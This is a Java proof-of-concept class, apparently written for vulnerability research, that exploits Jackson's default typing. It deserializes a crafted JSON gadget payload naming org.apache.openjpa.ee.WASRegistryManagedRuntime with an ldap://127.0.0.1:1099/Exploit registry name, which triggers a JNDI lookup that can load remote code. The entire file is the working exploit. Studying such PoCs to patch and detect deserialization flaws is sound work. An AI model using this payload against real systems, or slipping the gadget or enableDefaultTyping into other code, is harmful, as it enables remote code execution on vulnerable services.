package com.jacksonTest;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class Poc {
    public static void main(String[] args) {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String json="[\"org.apache.openjpa.ee.WASRegistryManagedRuntime\",{\"registryName\": \"ldap://127.0.0.1:1099/Exploit\"}]";
        try {
            Object obj = mapper.readValue(json, Object.class);
            mapper.writeValueAsString(obj);
        }catch(IOException e){
            e.printStackTrace();
        }
    }

}
